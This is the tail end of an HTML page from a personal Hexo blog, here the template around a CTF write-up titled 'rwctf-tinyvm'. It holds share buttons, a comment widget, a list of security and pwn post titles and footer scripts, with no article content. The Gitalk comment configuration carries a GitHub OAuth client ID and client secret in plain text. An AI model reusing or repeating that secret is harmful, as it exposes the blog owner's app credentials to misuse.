+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"rwctf-tinyvm　| welc0me　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+<!-- 
+    
+ -->
+
+
+  
+      <section id='comments' style='margin: 2em; padding: 2em; background: rgba(255, 255, 255, 0.5)'>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk@latest/dist/gitalk.min.js"></script>
+    <div id="gitalk-container"></div>
+    <script type="text/javascript">
+      var gitalk = new Gitalk({
+        clientID: 'fb4ffdde2e800246e49f',
+        clientSecret: 'b550860fb0906da0fc324e3c81448cd676b55f9e',
+        repo: 'nicholas-wei.github.io',
+        owner: 'nicholas-wei',
+        admin: ['nicholas-wei'],
+        id: window.location.pathname
+      })
+      gitalk.render('gitalk-container')
+    </script>
+  </section>
+  
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2023/01/24/bi0sctf-2023/" title="上一篇: bi0sctf-2023">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2023/01/19/wasm-pwn/" title="下一篇: wasm-1">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2023/07/12/testfile/">testfile</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/05/03/decrypt-wechat-db/">decrypt-wechat-db</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/05/02/tamuctf-pwnme/">tamuctf-pwnme</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/03/20/ej/">ej</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/02/07/royal_ransomeware/">royal_randomeware analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/02/05/mirai/">mirai_botnet_analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/01/26/corctf2022-corchat/">corctf2022-corchat</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/01/24/bi0sctf-2023/">bi0sctf-2023</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/01/20/rwctf-tinyvm/">rwctf-tinyvm</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/01/19/wasm-pwn/">wasm-1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/12/27/ics-pa1/">ics-pa</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/11/13/llvm-pass1/">llvm-pass1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/09/14/leetcode-1/">leetcode-1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/28/dp/">dp</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/19/Directed-Grey-Box-Fuzzing-with-Provable-Path-Pruning/">Directed_Grey-Box_Fuzzing_with_Provable_Path_Pruning</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/13/Constraint-guided-Directed-Greybox-Fuzzing/">Constraint-guided_Directed_Greybox_Fuzzing</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/10/crafting-interpreters4/">crafting-interpreters4</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/07/crafting-interpreters3/">crafting-interpreters3</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/04/crafting-interpreters2/">crafting-interpreters2——scanning</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/02/house-of-cat/">house-of-cat</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/07/29/crafting-interpreters1/">crafting_interpreters 1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/07/28/dice2022-hope/">dice2022@hope</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/30/software-security-lab6/">software-security-lab6</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/18/software-security-lab5/">software-security-lab5</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/18/volgaCTF2022-pwn/">volgaCTF2022_pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/08/pyjail/">pyjail</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/05/angstormCTF2022-pwn/">angstormCTF2022_pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/04/software-security-lab4/">software-security-lab4</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/27/pwnhub2022/">pwnhub2022_easyrop</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/25/b01lersCTF2022-pwn/">b01lersCTF2022_pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/15/hackpark2022-shiftycode/">hackpark2022_shiftycode</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/14/input_check_lab/">software-security-lab3</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/07/software-security-lab2/">software-security-lab2</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/07/matlab-2/">matlab-2</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/04/FuzzBuilder-src-understand/">FuzzBuilder_src_understand</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/04/SpaceHeroCTF2022-pwn-wp/">SpaceHeroCTF2022_pwn_wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/01/fb-bot-discord/">fb-bot_discord</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/31/matlab-1/">matlab-1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/29/zer0pts2022-accountant/">zer0pts2022_accountant</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/17/fuzzing-6-grammer-fuzzing/">fuzzing-6-grammer_fuzzing</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/16/fuzzing-5-parallelize/">fuzzing-5-parallelize</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/15/fuzzing-4-code_coverage/">fuzzing-4</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/13/fuzzing-2/">fuzzing-2</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/09/software-security-lab1/">software-security_lab1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/09/fuzzing-1-gegeral-knowledge/">fuzzing-1-gegeral_knowledge</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/07/umdctf2022-pwn/">umdctf2022-pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/06/kernel-6-HijackPrctl/">kernel-6-HijackPrctl</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/02/pwnable-re-alloc-revenge/">pwnable-re-alloc_revenge</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/28/SUSCTF2022-pwn/">SUSCTF2022-pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/23/tqlctf-nemu/">tqlctf-nemu</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/23/fastbin-reverse-into-tcache/">fastbin-reverse-into-tcache</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/15/kernel-5-bypass-smep1/">kernel-5-bypass_smep1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/14/pwnable-babystack/">pwnable-babystack</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/11/kernel-4-doubleFetch/">kernel-4-doubleFetch</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/07/tcache-stashing-unlink-attack/">tcache-stashing-unlink-attack</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/03/IO-file-vtable/">IO_file常见利用方法&原理(二)</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/01/pwnable-realloc/">pwnable-realloc</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/31/kernel-3-UAF/">kernel-3-UAF</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/29/IO-file/">IO_file常见利用方法&原理(一)</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/29/largebin-attack/">largebin-attack</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/28/hws2022%E5%86%AC%E4%BB%A4%E8%90%A5ctf/">hws2022冬令营入营赛pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/27/RWctf-2022-svme/">RWctf-2022-svme</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/24/kernel-2-stkof/">kernel-2-stkof</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/23/kernel-1-basic_knowledge/">kernel-1-basic_knowledge</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/22/Drangonctf2021-noflippidy/">Drangonctf2021-noflippidy</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/21/dicectf2021-flippidy/">dicectf2021_flippidy</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2022-2023 nich0las
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 1;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+    <script>
+        var originTitle = document.title;
+        var titleTime;
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                document.title = "(つェ⊂) 我藏好了哦~ " + originTitle;
+                clearTimeout(titleTime);
+            }
+            else {
+                document.title = "(*´∇｀*) 被你发现啦~ " + originTitle;
+                titleTime = setTimeout(function() {
+                    document.title = originTitle;
+                }, 2000);
+            }
+        })
+    </script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
